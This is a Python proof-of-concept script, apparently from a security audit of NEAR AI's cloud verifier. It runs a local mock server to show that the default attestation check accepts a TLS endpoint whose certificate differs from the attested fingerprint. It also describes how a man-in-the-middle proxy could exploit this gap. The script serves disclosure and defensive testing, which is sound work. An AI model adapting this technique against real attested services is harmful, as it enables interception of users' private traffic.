#!/usr/bin/env python3
"""
F6 demo — live TLS channel is unbound from the attestation.

The attestation response claims `tls_cert_fingerprint = SPKI(K_A)`.
The mock's TLS endpoint actually terminates with a *different* cert
whose SPKI is `SPKI(K_B)`.

Two checks are exercised against the same attestation+endpoint pair:

  1. `check_report_data` from nearai-cloud-verifier's
     `py/model_verifier.py`. This verifies *internal consistency*:
     `report_data[0..32] == SHA256(signing_address || claimed_tls_fp)`.
     It never reads the live socket's certificate, so it is
     indifferent to whether `claimed_tls_fp` corresponds to the
     actual TLS endpoint.

  2. `tls_verifier.py`'s pattern: open a TLS connection to the same
     endpoint, extract the live SPKI, compare it to the attestation's
     `tls_cert_fingerprint`. This catches the mismatch.

The PoC therefore demonstrates: a verifier that runs the default
`model_verifier.py` flow against a real cloud-api endpoint does NOT
detect that the TLS connection terminates at a different keypair
than the attestation describes. Only an explicit invocation of
`tls_verifier.py` (or equivalent logic) does.

NEAR AI's `nearai-cloud-verifier` source tree is not modified;
the PoC imports `model_verifier` from the cloned repository and
mirrors `tls_verifier`'s SPKI extraction inline.
"""

import argparse
import base64
import hashlib
import http.server
import json
import os
import socket
import socketserver
import ssl
import sys
import tempfile
import threading
import time
import types
import urllib.parse
import urllib.request

from datetime import datetime, timedelta, timezone

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

DEFAULT_NEARAI_SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "nearai-cloud-verifier")

# Constant signing address for the attestation; would be derived from
# a real signing key in production.
SIGNING_ADDRESS = "0x" + "ab" * 20


def _gen_ec_key_and_cert(common_name: str) -> tuple[ec.EllipticCurvePrivateKey, x509.Certificate]:
    """Generate a fresh SECP256R1 keypair and a 10-year self-signed cert."""
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    subject = issuer = x509.Name([
        x509.NameAttribute(x509.NameOID.COMMON_NAME, common_name),
    ])
    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(minutes=5))
        .not_valid_after(now + timedelta(days=3650))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost"),
                                         x509.IPAddress(__import__('ipaddress').IPv4Address("127.0.0.1"))]),
            critical=False,
        )
        .sign(private_key, hashes.SHA256(), default_backend())
    )
    return private_key, cert


def _spki_hash(cert: x509.Certificate) -> str:
    """Mirror nearai-cloud-verifier/py/tls_verifier._compute_spki_hash."""
    spki_der = cert.public_key().public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return hashlib.sha256(spki_der).hexdigest()


def _write_pem(private_key: ec.EllipticCurvePrivateKey,
               cert: x509.Certificate, dirpath: str, label: str) -> tuple[str, str]:
    key_path = os.path.join(dirpath, f"{label}.key.pem")
    cert_path = os.path.join(dirpath, f"{label}.cert.pem")
    with open(key_path, "wb") as fh:
        fh.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))
    with open(cert_path, "wb") as fh:
        fh.write(cert.public_bytes(serialization.Encoding.PEM))
    return key_path, cert_path


def _build_attestation_body(claimed_tls_fp: str, nonce_hex: str) -> dict:
    """Construct an attestation response with `tls_cert_fingerprint`
    set to `claimed_tls_fp`. The report_data binds
    SHA256(signing_address || claimed_tls_fp) || nonce so the
    `check_report_data` internal-consistency check passes."""
    addr_bytes = bytes.fromhex(SIGNING_ADDRESS.removeprefix("0x"))
    fp_bytes = bytes.fromhex(claimed_tls_fp)
    nonce_bytes = bytes.fromhex(nonce_hex)
    expected_first32 = hashlib.sha256(addr_bytes + fp_bytes).digest()
    report_data = (expected_first32 + nonce_bytes[:32]).hex()

    # Pad report_data to the offset model_verifier.check_tdx_quote
    # reads from. The real layout is dictated by Intel's TD10 spec;
    # we synthesize a payload large enough for the verifier's
    # extraction logic.
    quote_body = report_data + ("00" * 64)  # padding for non-checked fields

    return {
        "gateway_attestation": {
            "signing_address": SIGNING_ADDRESS,
            "signing_algo": "ecdsa",
            "intel_quote": quote_body,
            "tls_cert_fingerprint": claimed_tls_fp,
            "info": {"tcb_info": json.dumps({"app_compose": "{}"})},
        }
    }


class _AttestationHandler(http.server.BaseHTTPRequestHandler):
    """HTTPS handler that returns an attestation response with a
    fixed claimed TLS fingerprint, regardless of what cert the TLS
    layer actually presents to the client."""

    # Class-level config set by start_https_server
    CLAIMED_TLS_FP = ""

    def log_message(self, format, *args):
        sys.stderr.write(f"[server] {format % args}\n")

    def do_GET(self):  # noqa: N802
        url = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(url.query)
        if url.path == "/v1/attestation/report":
            nonce = params.get("nonce", [""])[0] or ("00" * 32)
            body = _build_attestation_body(self.CLAIMED_TLS_FP, nonce)
            data = json.dumps(body).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return
        self.send_error(404)


class _ReuseHTTPServer(http.server.HTTPServer):
    allow_reuse_address = True
    daemon_threads = True

    def server_bind(self):
        # Inherit the standard bind, then bump the SO_REUSEADDR/PORT options.
        super().server_bind()


def start_https_server(host: str, port: int, cert_path: str, key_path: str,
                       claimed_tls_fp: str) -> _ReuseHTTPServer:
    _AttestationHandler.CLAIMED_TLS_FP = claimed_tls_fp
    server = _ReuseHTTPServer((host, port), _AttestationHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server


def _import_check_report_data(nearai_src: str):
    """Import `check_report_data` from `py/model_verifier.py` without
    triggering its top-level dcap_qvl / requests imports."""
    if nearai_src not in sys.path:
        sys.path.insert(0, os.path.join(nearai_src, "py"))
    if "dcap_qvl" not in sys.modules:
        stub = types.ModuleType("dcap_qvl")
        async def _bad(*a, **k):
            raise RuntimeError("dcap_qvl stubbed; full TDX verification not exercised in F6 demo")
        stub.get_collateral_and_verify = _bad
        sys.modules["dcap_qvl"] = stub
    try:
        import requests  # noqa: F401
    except ImportError:
        stub = types.ModuleType("requests")
        for name in ("get", "post", "head"):
            setattr(stub, name, lambda *a, **k: (_ for _ in ()).throw(
                RuntimeError("requests stubbed; F6 demo uses urllib instead")))
        sys.modules["requests"] = stub
    import model_verifier  # noqa: WPS433
    return model_verifier.check_report_data


def fetch_attestation(host: str, port: int, nonce_hex: str) -> dict:
    """Fetch the attestation over TLS with cert verification disabled
    (mirrors tls_verifier.py: trust comes from TEE binding, not CA)."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = f"https://{host}:{port}/v1/attestation/report?nonce={nonce_hex}"
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, context=ctx) as resp:
        return json.loads(resp.read())


def fetch_live_spki(host: str, port: int) -> str:
    """Equivalent of tls_verifier._compute_spki_hash applied to the
    leaf cert from a fresh TLS connection."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=5) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            cert_der = ssock.getpeercert(binary_form=True)
    cert = x509.load_der_x509_certificate(cert_der, default_backend())
    return _spki_hash(cert)


def _build_intel_result(attestation: dict) -> dict:
    """Construct the dict shape that nearai's check_report_data expects
    (mirrors what check_tdx_quote builds from a real dcap_qvl run)."""
    intel_quote_hex = attestation["gateway_attestation"]["intel_quote"]
    return {
        "quote": {"body": {"reportdata": intel_quote_hex[:128]}},
        "verified": True,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--nearai-src", default=DEFAULT_NEARAI_SRC)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=18443)
    args = parser.parse_args()

    if not os.path.isdir(args.nearai_src):
        print(f"error: --nearai-src not found: {args.nearai_src}", file=sys.stderr)
        return 1

    check_report_data = _import_check_report_data(args.nearai_src)

    workdir = tempfile.mkdtemp(prefix="nearai-f6-")
    print(f"[+] workdir: {workdir}")

    # Generate two ECDSA-P256 keypairs and self-signed certs.
    key_a, cert_a = _gen_ec_key_and_cert("attested-enclave.example")
    key_b, cert_b = _gen_ec_key_and_cert("attacker-tls-endpoint.example")
    spki_a = _spki_hash(cert_a)
    spki_b = _spki_hash(cert_b)
    print(f"[+] SPKI(K_A) (claimed in attestation): {spki_a}")
    print(f"[+] SPKI(K_B) (actual TLS endpoint):    {spki_b}")
    print(f"        K_A == K_B? {spki_a == spki_b}")
    print()

    # Server will present cert K_B at the TLS layer but claim K_A in
    # the attestation response body.
    _, cert_b_path = _write_pem(key_b, cert_b, workdir, "live")
    key_b_path = os.path.join(workdir, "live.key.pem")
    with open(key_b_path, "wb") as fh:
        fh.write(key_b.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))

    print(f"[+] Starting HTTPS server at https://{args.host}:{args.port}")
    print("    TLS cert is K_B; attestation body will claim K_A.")
    server = start_https_server(args.host, args.port, cert_b_path, key_b_path, spki_a)
    try:
        # Give the server a moment to start.
        time.sleep(0.2)

        nonce = "ab" * 32
        attestation = fetch_attestation(args.host, args.port, nonce)
        gw = attestation["gateway_attestation"]
        claimed_fp = gw["tls_cert_fingerprint"]
        print(f"\n[+] Fetched attestation. Claimed tls_cert_fingerprint = {claimed_fp}")

        # --- Check 1: internal consistency (model_verifier.check_report_data)
        print()
        print("=" * 72)
        print("Check 1 — model_verifier.check_report_data (internal consistency)")
        print("=" * 72)
        intel_result = _build_intel_result(attestation)
        check_result = check_report_data(gw, nonce, intel_result)
        print(f"    binds_address: {check_result.get('binds_address')}")
        print(f"    embeds_nonce:  {check_result.get('embeds_nonce')}")
        internal_ok = check_result.get("binds_address") and check_result.get("embeds_nonce")
        if internal_ok:
            print("    [+] Internal consistency check PASSED.")
            print("        The verifier accepted the attestation because its")
            print("        report_data correctly binds the *claimed* tls fingerprint.")
        else:
            print("    [!] Internal consistency check failed unexpectedly.")
            return 2

        # --- Check 2: live TLS endpoint cert (tls_verifier-style)
        print()
        print("=" * 72)
        print("Check 2 — tls_verifier-style live-cert SPKI comparison")
        print("=" * 72)
        live_fp = fetch_live_spki(args.host, args.port)
        print(f"    Claimed (in attestation): {claimed_fp}")
        print(f"    Live socket SPKI:         {live_fp}")
        live_matches = claimed_fp == live_fp
        if live_matches:
            print("    [!] PoC failed: live SPKI matched claimed — something's wrong.")
            return 2
        print("    [+] Live SPKI does NOT match the claimed value.")
        print("        tls_verifier.py (or model_verifier.py --verify-tls) would")
        print("        reject the attestation here. The default model_verifier")
        print("        flow never performs this comparison.")

        # --- Result
        print()
        print("=" * 72)
        print("Result")
        print("=" * 72)
        print(f"    Default verifier (internal-only) accepts: {internal_ok}")
        print(f"    Live-SPKI binding detects mismatch:        {not live_matches}")
        if internal_ok and not live_matches:
            print()
            print("[+] ATTACK CONFIRMED (P9, F6 — live channel binding opt-in)")
            print("    The attestation is internally consistent — its report_data")
            print("    correctly binds the claimed tls_cert_fingerprint, so")
            print("    `model_verifier.check_report_data` passes. But the live")
            print("    TLS endpoint terminates at a different key. A verifier")
            print("    using the default flow (no --verify-tls, no tls_verifier.py)")
            print("    does not catch this mismatch.")
            print()
            print("    In production: an MITM (or operator-controlled reverse")
            print("    proxy) sits between client and the actual attested")
            print("    enclave, terminating TLS, observing plaintext, possibly")
            print("    modifying it, then forwarding to the real enclave for")
            print("    legitimate downstream processing. Every byte of the")
            print("    attestation chain remains honest; only the channel is")
            print("    unbound.")
            return 0
        return 2
    finally:
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    raise SystemExit(main())
